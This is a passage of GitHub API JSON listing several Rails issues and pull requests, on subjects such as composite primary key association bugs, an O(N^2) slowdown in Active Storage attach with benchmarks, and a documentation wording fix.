        "body": "### Motivation / Background\r\n\r\nFrom Active Record Querying docs:\r\n\r\n> [12.1.3 Joining Multiple Associations](https://guides.rubyonrails.org/active_record_querying.html#joining-multiple-associations)\r\n> \r\n> Book.joins(:author, :reviews)\r\n>\r\n> This produces:\r\n> .....\r\n> Or, in English: \"return all books with their author ...\"\r\n\r\nThe English statement is wrong. English text implies it returns the book **and** the author.\r\n\r\nHowever, The code will return books only and the join means the returned books will have an author with at least 1 review.\r\n\r\nChanging the text to imply it returns books **with an** author instead of books and the author.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [X] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [X] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [X] Tests are added or updated if you fix a bug or add a feature.\r\n* [X] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50851/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50851/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50850",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50850/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50850/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50850/events",
        "html_url": "https://github.com/rails/rails/issues/50850",
        "id": 2095807650,
        "node_id": "I_kwDNIULOfOt8og",
        "number": 50850,
        "title": "belongs_to association doesn't work with composite `primary_key` option",
        "user": {
            "login": "bguban",
            "id": 1564376,
            "node_id": "MDQ6VXNlcjE1NjQzNzY=",
            "avatar_url": "https://avatars.githubusercontent.com/u/1564376?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/bguban",
            "html_url": "https://github.com/bguban",
            "followers_url": "https://api.github.com/users/bguban/followers",
            "following_url": "https://api.github.com/users/bguban/following{/other_user}",
            "gists_url": "https://api.github.com/users/bguban/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/bguban/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/bguban/subscriptions",
            "organizations_url": "https://api.github.com/users/bguban/orgs",
            "repos_url": "https://api.github.com/users/bguban/repos",
            "events_url": "https://api.github.com/users/bguban/events{/privacy}",
            "received_events_url": "https://api.github.com/users/bguban/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 4,
        "created_at": "2024-01-23T10:56:14Z",
        "updated_at": "2024-01-25T15:00:48Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\nI have an aggregator model that represents the same entity from different providers. This model has a single primary but some of the providers have a composite key. So I must use 2 columns to be able to build the reflection\r\n\r\n```\r\nclass Ticker < ApplicationRecord\r\n  # this model has gvkey and iid but they are not the primary key. just fields to build the relation\r\n  has_many :co_actions, primary_key: [:gvkey, :iid], query_constraints: [:gvkey, :iid]\r\nend\r\n\r\nclass CoAction\r\n  # this model has gvkey and iid as a foreign key\r\n  belongs_to :ticker, primary_key: [:gvkey, :iid], query_constraints: [:gvkey, :iid]\r\nend\r\n```\r\n\r\nWhen I run\r\n```\r\nCoAction.take.ticker\r\n```\r\nit returns\r\n```\r\n/activerecord-7.1.3/lib/active_record/reflection.rb:576:in `check_validity!': Association CoAction#ticker primary key [:gvkey, :iid] doesn't match with foreign key [\"gvkey\", \"iid\"]. Please specify query_constraints, or primary_key and foreign_key values. (ActiveRecord::CompositePrimaryKeyMismatchError)\r\n```\r\nbut I would expect to receive the ticker model instead. The composite_primary_key gem does what expected but rails 7.1.3 relation builder converts the primary key into a string instead. So what you see in the message is a string `\"[:gvkey, :iid]\"`. (ActiveRecord::Reflection::BelongsToReflection#association_primary_key)\r\n\r\n### System configuration\r\n**Rails version**: 7.1.3\r\n\r\n**Ruby version**: 3.2.1\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50850/reactions",
            "total_count": 1,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 1,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50850/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50849",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50849/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50849/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50849/events",
        "html_url": "https://github.com/rails/rails/pull/50849",
        "id": 2095108275,
        "node_id": "PR_kwDNIULOZMkKDg",
        "number": 50849,
        "title": "Fixes ActionView::Template::Error when pasting images via Trix",
        "user": {
            "login": "schristm",
            "id": 24068,
            "node_id": "MDQ6VXNlcjI0MDY4",
            "avatar_url": "https://avatars.githubusercontent.com/u/24068?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/schristm",
            "html_url": "https://github.com/schristm",
            "followers_url": "https://api.github.com/users/schristm/followers",
            "following_url": "https://api.github.com/users/schristm/following{/other_user}",
            "gists_url": "https://api.github.com/users/schristm/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/schristm/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/schristm/subscriptions",
            "organizations_url": "https://api.github.com/users/schristm/orgs",
            "repos_url": "https://api.github.com/users/schristm/repos",
            "events_url": "https://api.github.com/users/schristm/events{/privacy}",
            "received_events_url": "https://api.github.com/users/schristm/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 1180817762,
                "node_id": "MDU6TGFiZWwxMTgwODE3NzYy",
                "url": "https://api.github.com/repos/rails/rails/labels/actiontext",
                "name": "actiontext",
                "color": "3bc667",
                "default": false,
                "description": ""
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-23T02:14:58Z",
        "updated_at": "2024-01-23T02:15:02Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50849",
            "html_url": "https://github.com/rails/rails/pull/50849",
            "diff_url": "https://github.com/rails/rails/pull/50849.diff",
            "patch_url": "https://github.com/rails/rails/pull/50849.patch",
            "merged_at": null
        },
        "body": "The asset pipeline really shouldn't be checked for remote images regardless, but this also happens to fix an issue with images pasted into Trix that get serialized as action-text-attachments with \"blob:\" urls.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50849/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50849/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50848",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50848/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50848/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50848/events",
        "html_url": "https://github.com/rails/rails/issues/50848",
        "id": 2095071717,
        "node_id": "I_kwDNIULOfOBB5Q",
        "number": 50848,
        "title": "O(N^2) operation in `CollectionAssociation#replace_common_records_in_memory` and **another** O(N^2) operation in `ActiveStorage::Attached::Many#attach`",
        "user": {
            "login": "malavbhavsar",
            "id": 1080592,
            "node_id": "MDQ6VXNlcjEwODA1OTI=",
            "avatar_url": "https://avatars.githubusercontent.com/u/1080592?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/malavbhavsar",
            "html_url": "https://github.com/malavbhavsar",
            "followers_url": "https://api.github.com/users/malavbhavsar/followers",
            "following_url": "https://api.github.com/users/malavbhavsar/following{/other_user}",
            "gists_url": "https://api.github.com/users/malavbhavsar/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/malavbhavsar/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/malavbhavsar/subscriptions",
            "organizations_url": "https://api.github.com/users/malavbhavsar/orgs",
            "repos_url": "https://api.github.com/users/malavbhavsar/repos",
            "events_url": "https://api.github.com/users/malavbhavsar/events{/privacy}",
            "received_events_url": "https://api.github.com/users/malavbhavsar/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-23T01:29:33Z",
        "updated_at": "2024-01-23T01:39:19Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\nApologies for not following the template. I wasn't sure how to include my half-baked fix with it... I have full repro and additional information here: [malavbhavsar/rails#1](https://github.com/malavbhavsar/rails/pull/1) \r\n\r\n```ruby\r\nuser_1 = User.create!(name: \"Jason\")\r\nuser_1.highlights.attach(\r\n  1000.times.map do |i|\r\n    {\r\n      io: StringIO.new(\"Example string inside text_file_#{i}\"),\r\n      filename: \"text_file_#{i}.txt\",\r\n      content_type: \"text/plain\",\r\n    }\r\n  end\r\n)\r\nuser_1.save!\r\nuser_1.reload\r\n\r\n# Below operation takes 5 seconds\r\nBenchmark.bm(30) do |x|\r\n  x.report(\"attach performance without fix\") do\r\n    user_1.highlights.attach(\r\n      {\r\n        io: StringIO.new(\"another text file. wow.\"),\r\n        filename: \"text_file_another.txt\",\r\n        content_type: \"text/plain\",\r\n      }\r\n    )\r\n  end\r\nend\r\n```\r\n\r\n### Expected behavior\r\nExecution time of `#attach` should not depend on how big a collection is.\r\n\r\n### Actual behavior\r\nOn a big `has_many_attached` collection, `#attach` takes a long time. If there are 1000 existing attachments, it will take 5 seconds to attach a new one.\r\n\r\n### System configuration\r\n**Rails version**: `main`\r\n\r\n**Ruby version**: `3.1.4`\r\n\r\n### Explanation\r\nWhen we call `#attach` on an already big activestorage collection, it first calls `record.public_send(\"#{name}=\", blobs + attachables.flatten) # e.g. record.highlights=...`. This eventually ends up calling `CollectionAssociation#replace_common_records_in_memory` which has been discovered as a performance problem in #46652. It ends up calling `Array#index` **n** times and `#==` **(n*n1)/2** times. In this case, `499500` times.\r\n\r\nFor ActiveRecord has_many collections, this is not a huge problem because, in my experience, `post.comments = new_comments` is not a common pattern. The general use case is `post.comments << new_comment`, which does pretty well performance-wise.\r\n\r\nUnfortunately for `has_many_attached` collection, calling `#attach` is a common use case and it calls `record.things_attachments=` under the hood. Aside - seems like people are running into this [problem](https://discuss.rubyonrails.org/t/attach-pictures-gets-very-slow/81684).\r\n\r\n### Flamegraph\r\n![flamegraph_1](https://github.com/rails/rails/assets/1080592/0bef4acf-aaa7-44b8-a830-daf4a6717ab5)\r\n\r\n### Possible solutions\r\n- Get #46652 merged\r\n- If we are concerned about the increased complexity of `@target_index_map` in #46652, I tried the [same approach with a local variable](https://github.com/malavbhavsar/rails/pull/1/files#diff-ceff30ddab4e756e3a70ece45076eb17ff2f587a068dae657d2ad3a265a3f0d6) and it helped.\r\n\r\n### ANOTHER problem\r\nAs flamegraph shows, there is another O(N^2) in `#attach`. That one is coming from `Attached::Changes::CreateOneOfMany#find_attachment`. I haven't figured out a possible solution for it... I don't understand the change tracking(?) active storage is doing but if someone can help me understand I can try fixing it. I assume this will probably need a new `Attached::Changes::AttachMany` and `Attached::Changes::AttachOne`?\r\n\r\n### Workaround\r\nI have found that creating blobs and attachments manually gets rid of BOTH problems and doesn't leave `highlights_attachments` and `highlights_blobs` stale.\r\n\r\n```ruby\r\nuser_3 = User.create!(name: \"Lauren\")\r\nuser_3.highlights.attach(\r\n  1000.times.map do |i|\r\n    {\r\n      io: StringIO.new(\"Example string inside text_file_#{i}\"),\r\n      filename: \"text_file_#{i}.txt\",\r\n      content_type: \"text/plain\",\r\n    }\r\n  end\r\n)\r\nuser_3.save!\r\nuser_3.reload\r\n\r\n# Below operation takes 0.02 second\r\nApplicationRecord.transaction do\r\n  blob = ActiveStorage::Blob.create_and_upload!(\r\n    io: StringIO.new(\"another text file. wow.\"),\r\n    filename: \"text_file_another.txt\",\r\n    content_type: \"text/plain\",\r\n  )\r\n  user_3.highlights_attachments.create!(\r\n    blob_id: blob.id,\r\n    name: 'highlights',\r\n  )\r\n  user_3.save!\r\nend\r\n```\r\n\r\n### Final performance stats\r\n\r\n```\r\n                                              user     system      total        real\r\nattach performance without fix            4.711782   0.013564   4.725346 (  4.760098)\r\n                                              user     system      total        real\r\nattach performance with half-ish fix      1.855833   0.009120   1.864953 (  1.901090)\r\n                                              user     system      total        real\r\nattach performance manual                 0.024790   0.002624   0.027414 (  0.030269)\r\n```\r\n\r\ncc: @jonathanhefner, @jeffcarbs, @danny-pflughoeft",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50848/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50848/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50847",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50847/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50847/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50847/events",
        "html_url": "https://github.com/rails/rails/pull/50847",
        "id": 2095004070,
        "node_id": "PR_kwDNIULOZMemqg",
        "number": 50847,
        "title": "perf: example showing O(N**2) in has_many_attached",
        "user": {
            "login": "malavbhavsar",
            "id": 1080592,
            "node_id": "MDQ6VXNlcjEwODA1OTI=",
            "avatar_url": "https://avatars.githubusercontent.com/u/1080592?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/malavbhavsar",
            "html_url": "https://github.com/malavbhavsar",
            "followers_url": "https://api.github.com/users/malavbhavsar/followers",
            "following_url": "https://api.github.com/users/malavbhavsar/following{/other_user}",
            "gists_url": "https://api.github.com/users/malavbhavsar/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/malavbhavsar/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/malavbhavsar/subscriptions",
            "organizations_url": "https://api.github.com/users/malavbhavsar/orgs",
            "repos_url": "https://api.github.com/users/malavbhavsar/repos",
            "events_url": "https://api.github.com/users/malavbhavsar/events{/privacy}",
            "received_events_url": "https://api.github.com/users/malavbhavsar/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 664533972,
                "node_id": "MDU6TGFiZWw2NjQ1MzM5NzI=",
                "url": "https://api.github.com/repos/rails/rails/labels/activestorage",
                "name": "activestorage",
                "color": "bfd4f2",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-01-23T00:12:28Z",
        "updated_at": "2024-01-23T01:31:40Z",
        "closed_at": "2024-01-23T00:14:28Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": true,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50847",
            "html_url": "https://github.com/rails/rails/pull/50847",
            "diff_url": "https://github.com/rails/rails/pull/50847.diff",
            "patch_url": "https://github.com/rails/rails/pull/50847.patch",
            "merged_at": null
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nThis Pull Request has been created because [REPLACE ME]\r\n\r\n### Detail\r\n\r\nThis Pull Request changes [REPLACE ME]\r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [ ] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [ ] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50847/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50847/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50846",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50846/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50846/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50846/events",
        "html_url": "https://github.com/rails/rails/pull/50846",
        "id": 2094996849,
        "node_id": "PR_kwDNIULOZMeOHA",
        "number": 50846,
        "title": "Set ActiveRecord::RecordNotFound#id when raised from a call to #reload a deleted record",
        "user": {
            "login": "segiddins",
            "id": 1946610,
            "node_id": "MDQ6VXNlcjE5NDY2MTA=",
            "avatar_url": "https://avatars.githubusercontent.com/u/1946610?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/segiddins",
            "html_url": "https://github.com/segiddins",
            "followers_url": "https://api.github.com/users/segiddins/followers",
            "following_url": "https://api.github.com/users/segiddins/following{/other_user}",
            "gists_url": "https://api.github.com/users/segiddins/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/segiddins/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/segiddins/subscriptions",
            "organizations_url": "https://api.github.com/users/segiddins/orgs",
            "repos_url": "https://api.github.com/users/segiddins/repos",
            "events_url": "https://api.github.com/users/segiddins/events{/privacy}",
            "received_events_url": "https://api.github.com/users/segiddins/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-23T00:04:37Z",
        "updated_at": "2024-01-23T16:49:20Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50846",
            "html_url": "https://github.com/rails/rails/pull/50846",
            "diff_url": "https://github.com/rails/rails/pull/50846.diff",
            "patch_url": "https://github.com/rails/rails/pull/50846.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nThis Pull Request has been created because I am writing some tests for my app around records being deleted by calling `reload`, and there was no easy way to assert that the record raising the `ActiveRecord::RecordNotFound` exception was the record I was expecting\r\n\r\n### Detail\r\n\r\nThis Pull Request changes `raise_record_not_found_exception!` to find IDs based on the primary key from the where condition, if no IDs are explicitly passed\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50846/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50846/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50845",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50845/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50845/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50845/events",
        "html_url": "https://github.com/rails/rails/pull/50845",
        "id": 2094925056,
        "node_id": "PR_kwDNIULOZMaPKw",
        "number": 50845,
        "title": "Fix eager loading of composite primary key associations",
        "user": {
            "login": "nvasilevski",
            "id": 5512772,
            "node_id": "MDQ6VXNlcjU1MTI3NzI=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5512772?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/nvasilevski",
            "html_url": "https://github.com/nvasilevski",
            "followers_url": "https://api.github.com/users/nvasilevski/followers",
            "following_url": "https://api.github.com/users/nvasilevski/following{/other_user}",
            "gists_url": "https://api.github.com/users/nvasilevski/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/nvasilevski/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/nvasilevski/subscriptions",
            "organizations_url": "https://api.github.com/users/nvasilevski/orgs",
            "repos_url": "https://api.github.com/users/nvasilevski/repos",
            "events_url": "https://api.github.com/users/nvasilevski/events{/privacy}",
            "received_events_url": "https://api.github.com/users/nvasilevski/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-22T23:01:11Z",
        "updated_at": "2024-01-25T16:16:47Z",
        "closed_at": "2024-01-25T15:47:31Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50845",
            "html_url": "https://github.com/rails/rails/pull/50845",
            "diff_url": "https://github.com/rails/rails/pull/50845.diff",
            "patch_url": "https://github.com/rails/rails/pull/50845.patch",
            "merged_at": "2024-01-25T15:47:31Z"
        },
        "body": "Follow-up for https://github.com/rails/rails/pull/48490/\r\nFixes https://github.com/rails/rails/issues/50857\r\n\r\nPrevious code wrongly assumed that `keys.map { |key| row[key] }` returns an array of ids while it actually returns an identifier of a single model. For a single-column PK models it will return an array with 1 element and for a composite primary key model it will return an array of N elements where N is the number of composite primary key columns.\r\n\r\nIt lead to a bug where the constructed objects were wrongly populated in the cache due to cache key collision. For example `posts` records with composite keys like `[\"post1\", \"the_same_author\"]` and `[\"post2\", \"the_same_author\"]` end up sharing the same cache entry under the `the_same_author` key.\r\n\r\nThis commit fixes the issue by using full composite primary key values as a whole identifier.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50845/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50845/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50844",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50844/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50844/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50844/events",
        "html_url": "https://github.com/rails/rails/issues/50844",
        "id": 2094843344,
        "node_id": "I_kwDNIULOfNzF0A",
        "number": 50844,
        "title": "`ActionView::Template::Error`: Missing Active Model partial when rendered from Controller declared in module",
        "user": {
            "login": "seanpdoyle",
            "id": 2575027,
            "node_id": "MDQ6VXNlcjI1NzUwMjc=",
            "avatar_url": "https://avatars.githubusercontent.com/u/2575027?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/seanpdoyle",
            "html_url": "https://github.com/seanpdoyle",
            "followers_url": "https://api.github.com/users/seanpdoyle/followers",
            "following_url": "https://api.github.com/users/seanpdoyle/following{/other_user}",
            "gists_url": "https://api.github.com/users/seanpdoyle/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/seanpdoyle/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/seanpdoyle/subscriptions",
            "organizations_url": "https://api.github.com/users/seanpdoyle/orgs",
            "repos_url": "https://api.github.com/users/seanpdoyle/repos",
            "events_url": "https://api.github.com/users/seanpdoyle/events{/privacy}",
            "received_events_url": "https://api.github.com/users/seanpdoyle/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-01-22T22:05:18Z",
        "updated_at": "2024-01-23T15:20:29Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n\r\n```ruby\r\n# frozen_string_literal: true\r\n\r\nrequire \"bundler/inline\"\r\n\r\ngemfile(true) do\r\n  source \"https://rubygems.org\"\r\n\r\n  git_source(:github) { |repo| \"https://github.com/#{repo}.git\" }\r\n\r\n  gem \"rails\"\r\n  # If you want to test against edge Rails replace the previous line with this:\r\n  # gem \"rails\", github: \"rails/rails\", branch: \"main\"\r\nend\r\n\r\nrequire \"active_model/railtie\"\r\nrequire \"action_controller/railtie\"\r\n\r\nclass TestApp < Rails::Application\r\n  config.root = __dir__\r\n  config.hosts << \"example.org\"\r\n  config.secret_key_base = \"secret_key_base\"\r\n\r\n  config.logger = Logger.new($stdout)\r\n  Rails.logger  = config.logger\r\n\r\n  routes.draw do\r\n    get \"/\" => \"test#index\"\r\n    get \"/scoped\" => \"scoped/test#index\"\r\n  end\r\nend\r\n\r\nclass Model\r\n  include ActiveModel::Model\r\nend\r\n\r\nclass TestController < ActionController::Base\r\nend\r\n\r\nmodule Scoped\r\n  class TestController < ActionController::Base\r\n  end\r\nend\r\n\r\nrequire \"minitest/autorun\"\r\nrequire \"rack/test\"\r\n\r\nclass BugTest < Minitest::Test\r\n  include Rack::Test::Methods\r\n\r\n  def setup\r\n    super\r\n    @views = Dir.mktmpdir\r\n    ActionController::Base.prepend_view_path @views\r\n\r\n    view_file \"models/_model.html.erb\", \"Rendered\"\r\n    view_file \"test/index.html.erb\", \"<%= render Model.new %>\"\r\n    view_file \"scoped/test/index.html.erb\", \"<%= render Model.new %>\"\r\n  end\r\n\r\n  #  PASSES\r\n  def test_controller_renders_unscoped_partial\r\n    view_file \"models/_model.html.erb\", \"Rendered\"\r\n    view_file \"test/index.html.erb\", \"<%= render Model.new %>\"\r\n\r\n    get \"/\"\r\n\r\n    assert_predicate last_response, :ok?\r\n    assert_equal last_response.body, \"Rendered\"\r\n  end\r\n\r\n  #  PASSES\r\n  def test_scoped_controller_renders_scoped_partial\r\n    view_file \"scoped/models/_model.html.erb\", \"Rendered\"\r\n    view_file \"scoped/test/index.html.erb\", \"<%= render Model.new %>\"\r\n\r\n    get \"/scoped\"\r\n\r\n    assert_predicate last_response, :ok?\r\n    assert_equal last_response.body, \"Rendered\"\r\n  end\r\n\r\n  #  FAILS\r\n  def test_scoped_controller_renders_unscoped_partial\r\n    view_file \"models/_model.html.erb\", 